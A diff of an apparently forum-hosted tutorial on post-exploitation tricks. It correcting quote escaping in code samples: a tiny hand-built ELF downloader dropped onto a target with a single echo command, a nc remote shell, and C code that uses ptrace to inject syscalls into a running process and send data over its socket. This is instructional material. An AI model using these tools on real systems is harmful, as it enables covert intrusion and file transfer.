@@ -102,12 +102,13 @@ struct ip_addr {
 When using the structure we can access the different fields using the identifier indicated inside the `struct` declaration. In this case, the whole structure is 8 bytes long so it fits in a `long`. And that is what we had done in our program.
 
 
-     0x0100007f11110002 -> 01    --> 01
-                           00    --> 00
-	    				   00    --> 00
-		    			   7f    --> 127
-			    		   1111  --> Port
-				    	   0002  --> Address Family
+    0x0100007f11110002 -> 01    --> 01
+                               00    --> 00
+    	    				   00    --> 00
+    		    			   7f    --> 127
+    			    		   1111  --> Port
+    				    	   0002  --> Address Family
+						   
 
 
 
@@ -267,7 +268,7 @@ _exit:	mov rax, 60
 	ret
 	
 addr dq 0x0100007f11110002
-msg  db ""ERROR"", 10,0
+msg  db "ERROR", 10,0
 
 ```
 
@@ -353,7 +354,7 @@ This has already been mentioned in the forum. You can refer to [this](https://0x
 BITS 64
 	        org 0x400000
   ehdr:                                                 ; Elf32_Ehdr
-                db      0x7F, ""ELF"", 2, 1, 1, 0         ;   e_ident
+                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
         times 8 db      0
                 dw      2                               ;   e_type
                 dw      0x3e                            ;   e_machine
@@ -486,7 +487,7 @@ _do_syscall:
 	ret
 	
 addr dq 0x0100007f11110002
-msg  db ""ERROR"", 10,0
+msg  db "ERROR", 10,0
 filesize equ $ - $$
 
 ```
@@ -543,7 +544,7 @@ First, we reuse the 8 bytes reserved in the ELF header to add the initial code i
 BITS 64
                   org 0x400000
     ehdr:                                                 ; Elf32_Ehdr
-                  db      0x7F, ""ELF"", 2, 1, 1, 0         ;   e_ident
+                  db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
   _start: 
                   push rbp                ; 55
                   mov  rbp, rsp           ; 48 89 e5
@@ -574,7 +575,7 @@ BITS 64
 	org 0x400000
 BUF_SIZE:	equ 1024
   ehdr:                                                 ; Elf64_Ehdr
-                db      0x7F, ""ELF"", 2, 1, 1, 0         ;   e_ident
+                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
 _start:
   	            xor edi,edi		; 31 ff  - Sets EDI to 0
 	            inc edi         ; ff c7  - Sets EDI to 1
@@ -703,7 +704,7 @@ filesize equ $ - $$
 This version is 240 bytes long and it is suitable to be dropped using a single `echo`.
 
 ```bash
-echo -n -e ""\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x31\\xff\\xff\\xc7\\x57\\x5e\\xeb\\x68\\x02\\x00\\x3e\\x00\\x01\\x00\\x00\\x00\\x08\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x38\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xc7\\xba\\x06\\x00\\x00\\x00\\xe8\\x4b\\x00\\x00\\x00\\x89\\xc3\\x89\\xc7\\x48\\x8d\\x35\\x59\\x00\\x00\\x00\\x83\\xc2\\x0a\\xe8\\x3e\\x00\\x00\\x00\\x48\\x8d\\x34\\x24\\x89\\xdf\\xba\\x00\\x04\\x00\\x00\\xe8\\x1e\\x00\\x00\\x00\\x83\\xf8\\x00\\x7e\\x14\\x31\\xff\\xff\\xc7\\x89\\xc2\\xe8\\x12\\x00\\x00\\x00\\x3d\\x00\\x04\\x00\\x00\\x7c\\x02\\xeb\\xdb\\xe8\\x1c\\x00\\x00\\x00\\x31\\xc0\\xeb\\x1c\\x31\\xc0\\xff\\xc0\\xeb\\x16\\x31\\xc0\\x04\\x29\\xeb\\x10\\x31\\xc0\\x04\\x2a\\xeb\\x0a\\x31\\xc0\\x04\\x03\\xeb\\x04\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xc3\\x02\\x00\\x11\\x11\\x7f\\x00\\x00\\x01"" > fwget; chmod +x fwget
+echo -n -e "\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x31\\xff\\xff\\xc7\\x57\\x5e\\xeb\\x68\\x02\\x00\\x3e\\x00\\x01\\x00\\x00\\x00\\x08\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x38\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xc7\\xba\\x06\\x00\\x00\\x00\\xe8\\x4b\\x00\\x00\\x00\\x89\\xc3\\x89\\xc7\\x48\\x8d\\x35\\x59\\x00\\x00\\x00\\x83\\xc2\\x0a\\xe8\\x3e\\x00\\x00\\x00\\x48\\x8d\\x34\\x24\\x89\\xdf\\xba\\x00\\x04\\x00\\x00\\xe8\\x1e\\x00\\x00\\x00\\x83\\xf8\\x00\\x7e\\x14\\x31\\xff\\xff\\xc7\\x89\\xc2\\xe8\\x12\\x00\\x00\\x00\\x3d\\x00\\x04\\x00\\x00\\x7c\\x02\\xeb\\xdb\\xe8\\x1c\\x00\\x00\\x00\\x31\\xc0\\xeb\\x1c\\x31\\xc0\\xff\\xc0\\xeb\\x16\\x31\\xc0\\x04\\x29\\xeb\\x10\\x31\\xc0\\x04\\x2a\\xeb\\x0a\\x31\\xc0\\x04\\x03\\xeb\\x04\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xc3\\x02\\x00\\x11\\x11\\x7f\\x00\\x00\\x01" > fwget; chmod +x fwget
 
 ```
 
@@ -732,7 +733,7 @@ Now, from the hackers machine we can start a remote shell session like this:
 	
 At this point, we have a TCP connection to machine `target` going on. If we now get the pid can check the open file descriptors for this process:
 
-    hacker@hackerbox $ ps ax | grep ""nc target"" | head -1
+    hacker@hackerbox $ ps ax | grep "nc target" | head -1
      8095 pts/37   S+     0:00 nc target 1234
 	hacker@hackerbox $ ls -l /proc/8095/fd
 	total 0
@@ -761,11 +762,11 @@ So, the first thing we have to do, as indicated before is to get attached to the
 ```C
   _pid = atoi (argv[1]);
 
-  printf (""+ Attaching to process %ld\n"", _pid);
+  printf ("+ Attaching to process %ld\n", _pid);
   if ((ptrace (PTRACE_ATTACH, _pid, NULL, NULL)) < 0)
-    perror (""ptrace_attach:"");
+    perror ("ptrace_attach:");
   
-  printf (""%s"", "" ..... Waiting for process...\n"");
+  printf ("%s", " ..... Waiting for process...\n");
   wait (&status);
 ```
 The `atoi` function at the beginning allows us to convert a string (`Ascii`) to an number (`Integer`)(`AsciiTOInteger` -> `atoi`). Yes, we are passing the `pid` to attach to as a parameter to our program. Then we just find the `ptrace` system call being invoked with the _request_ `PTRACE_ATTACH` that allows us to get attached to the process indicated by the second parameter. Parameters 3 and 4 are not used for this request.
@@ -782,7 +783,7 @@ Now we have to do some tasks to be able to execute some code from within the pro
 
 ```C
   if ((ptrace (PTRACE_GETREGS, _pid, 0, &regs)) < 0) 
-      perror (""ptrace_get_regs:"");
+      perror ("ptrace_get_regs:");
   memcpy (&regs_cpy, &regs, sizeof (struct user_regs_struct));
 ```
 
@@ -799,7 +800,7 @@ We chose the second option, so we need to get the current opcode and overwrite i
 
 ```C
  if ((opcode = ptrace (PTRACE_PEEKTEXT, _pid, regs.rip, 0)) < 0)
-    perror (""retrieve opcode:"");
+    perror ("retrieve opcode:");
 (...)
   ptrace (PTRACE_POKETEXT, _pid, regs.rip, 0x050f050f050f050f);
 	
@@ -830,12 +831,12 @@ int cpy_str (pid_t _pid, char *str, unsigned long long int *p) {
   char                   *aux = malloc (len1 * 8);
   unsigned long long int *d = (unsigned long long int*)aux;
 
-  printf (""!! Reallocating %d to %d bytes\n"", len, len1);
+  printf ("!! Reallocating %d to %d bytes\n", len, len1);
   memset (aux, 0, len1);
   strcpy (d, str);
   
   for (i = 0; i < len1 + 1; i++)    {
-      if ((ptrace (PTRACE_POKEDATA, _pid, p, *d)) < 0) perror (""POKE Stack:"");
+      if ((ptrace (PTRACE_POKEDATA, _pid, p, *d)) < 0) perror ("POKE Stack:");
       p++; d++;
     }
 	
@@ -875,12 +876,12 @@ Now, everything is setup to send our data through the socket we had already iden
      regs.rdx= slen;      // Len of buffer to write
       
      if ((ptrace (PTRACE_SETREGS, _pid, 0, &regs)) < 0)
-	    perror (""ptrace_set_regs:"");
+	    perror ("ptrace_set_regs:");
 	
-     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) < 0) perror (""Run syscallL"");
+     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) < 0) perror ("Run syscallL");
      wait (&status);
 	  
-     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) < 0) perror (""Run syscallL"");
+     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) < 0) perror ("Run syscallL");
      wait (&status);
 ```
 
@@ -896,13 +897,13 @@ Finally, we just want to clean up, so our shell session keeps going normally. If
 
 ```C
   if ((ptrace (PTRACE_POKETEXT, _pid, regs_cpy.rip, opcode)) < 0) 
-       perror (""Restore opcode:"");
+       perror ("Restore opcode:");
 
   if ((ptrace (PTRACE_SETREGS, _pid, 0, &regs_cpy)) < 0) 
-       perror (""ptrace_set_regs:"");
+       perror ("ptrace_set_regs:");
   
   if ((ptrace (PTRACE_DETACH, _pid, NULL, NULL)) < 0) 
-       perror (""ptrace_deattach:"");
+       perror ("ptrace_deattach:");
   wait (&status);
 ```
 
